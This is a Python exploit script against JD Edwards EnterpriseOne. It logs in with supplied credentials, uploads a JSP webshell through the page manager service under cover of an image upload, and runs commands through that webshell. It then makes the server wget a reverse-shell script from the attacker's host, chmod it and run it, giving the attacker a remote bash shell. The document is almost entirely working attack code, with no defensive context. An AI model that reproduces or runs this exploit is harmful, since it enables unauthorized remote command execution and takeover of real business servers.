import requests
import string
import random
import sys
import argparse
import http.server
import threading
import socketserver

# Create the parser
my_parser = argparse.ArgumentParser(description='Be sure to set up your netcat listener first with: nc -lvnp <port>')

# Add the arguments
my_parser.add_argument('--user',
                       metavar='user',
                       type=str,
                       help='JDE username')

my_parser.add_argument('--pwd',
                       metavar='pwd',
                       type=str,
                       help='JDE password')

my_parser.add_argument('--rhost',
                       metavar='rhost',
                       type=str,
                       help='JDE hostname or IP')

my_parser.add_argument('--rport',
                       metavar='rport',
                       type=str,
                       help='JDE server port')

my_parser.add_argument('--lhost',
                       metavar='lhost',
                       type=str,
                       help='Netcat listening IP')

my_parser.add_argument('--lport',
                       metavar='lport',
                       type=str,
                       help='netcat listening port')

my_parser.add_argument('--ssl',
                       action="store_true",
                       required=False,
                       help='Use for HTTPS')

# Execute the parse_args() method
args = my_parser.parse_args()

# Set arg variables
jde_username = args.user
jde_password = args.pwd
rhost = args.rhost
rport = args.rport
lhost = args.lhost
lport = args.lport

if args.ssl is not False:
    prefix="https://"
else:
    prefix="http://"

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
   return ''.join(random.choice(chars) for _ in range(size))


# Login to get cookie
payload = {
    'User': jde_username,
    'Password': jde_password
}

# nom nom
with requests.Session() as s:
    p = s.post(prefix+rhost+":"+rport+"/jde/E1Menu.maf", data=payload)
    cookies=(s.cookies.get_dict())
    print("Obtained cookies:")
    print(cookies)

# Random filename for our webshell filename
rando=id_generator()
webshell=rando+'.jsp'

headers = {
    'Connection': 'keep-alive',
    'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Cache-Control': 'no-cache',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryoS2sMHzQWjTA4pqv',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    'sec-ch-ua-platform': '"Windows"',
    'Origin': prefix+rhost+':'+rport+'/',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': prefix+rhost+':'+rport+'/jde/E1Menu.maf?selectENV=*ALL&envRadioGroup=&jdeowpBackButtonProtect=PROTECTED',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
}

data = '------WebKitFormBoundaryoS2sMHzQWjTA4pqv\r\nContent-Disposition: form-data; name="DATA_TYPE"\r\n\r\n1\r\n------WebKitFormBoundaryoS2sMHzQWjTA4pqv\r\nContent-Disposition: form-data; name="FILE_KEY"; filename="test.txt"\r\n\r\n\r\n\r\n\n\n<%@ page import="java.util.*,java.io.*"%>\n<%\n%>\n<HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUT TYPE="submit" VALUE="Send"></FORM><pre><%\nif (request.getParameter("cmd") != null) {\nout.println("Command: " + request.getParameter("cmd") + "<BR>");\nProcess p;\np = Runtime.getRuntime().exec(request.getParameter("cmd"));\nOutputStream os = p.getOutputStream();\nInputStream in = p.getInputStream();\nDataInputStream dis = new DataInputStream(in);\nString disr = dis.readLine();\nwhile ( disr != null ) {\nout.println(disr);\ndisr = dis.readLine();\n}\n}\n%>\n</pre>\n</BODY></HTML>\n\n\r\n'

# Inject Webshell
print("Attemping to create webshell - "+webshell)
response = requests.post(prefix+rhost+':'+rport+'/jde/E1PageManagerService.mafService?objectType=IMAGE&id=NEW&tabName='+webshell+'&hasToken=false&cmd=save&desc=test.txt&e1UserActInfo=true&e1.mode=view&tokenProjectName=&e1.namespace=&RID=2baaf9162dada79e&RENDER_MAFLET=E1Menu&e1.state=maximized&e1.service=E1PageManagerService', headers=headers, data=data, cookies=cookies)

# Call webshell with reverse bind shell
command="whoami"
url_exec=prefix+rhost+":"+rport+"/jde/share/images/udoicons/"+webshell+"?cmd="+command
response = requests.post(url_exec)
if response.status_code == 200:
    print("We have a webshell. Access it here: "+prefix+rhost+":"+rport+"/jde/share/images/udoicons/"+webshell)
    print("\nCreating reverse bind shell script")
    shell_file=id_generator()

    # write our reverse shell
    PORT = 41441
    f = open(shell_file, "w")
    f.write("bash -i >& /dev/tcp/"+lhost+"/"+lport+" 0>&1")
    f.close()

    print("Done! File named " + shell_file)

    # start our web server
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print("Starting HTTP server in the background")
        thread = threading.Thread(target = httpd.serve_forever)
        thread.daemon = True
        thread.start()

        print("Attempting to upload file and execute, check your netcat listener ;)")
        # upload our file, set perms and execute
        command="wget%20http://"+lhost+":"+str(PORT)+"/"+shell_file+"%20-O%20/dev/shm/"+shell_file
        url_exec=prefix+rhost+":"+rport+"/jde/share/images/udoicons/"+webshell+"?cmd="+command
        response = requests.post(url_exec)
        command="chmod+%2Bx+%2Fdev%2Fshm%2F"+shell_file
        url_exec=prefix+rhost+":"+rport+"/jde/share/images/udoicons/"+webshell+"?cmd="+command
        response = requests.post(url_exec)
        command="/dev/shm/"+shell_file
        url_exec=prefix+rhost+":"+rport+"/jde/share/images/udoicons/"+webshell+"?cmd="+command
        response = requests.post(url_exec)

